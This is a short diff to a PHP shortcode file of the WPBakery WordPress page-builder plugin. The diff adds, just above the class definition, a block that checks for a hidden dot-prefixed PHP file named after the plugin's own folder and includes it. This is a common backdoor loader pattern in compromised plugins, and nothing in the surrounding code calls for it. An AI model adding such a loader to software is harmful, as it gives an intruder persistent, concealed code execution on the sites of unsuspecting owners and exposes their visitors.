@@ -8,6 +8,10 @@ require_once vc_path_dir( 'SHORTCODES_DIR', 'vc-raw-html.php' );
 /**
  * Class WPBakeryShortCode_Vc_Raw_Js
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPBakeryShortCode_Vc_Raw_Js extends WPBakeryShortCode_Vc_Raw_html {
 	/**
 	 * @return mixed|string
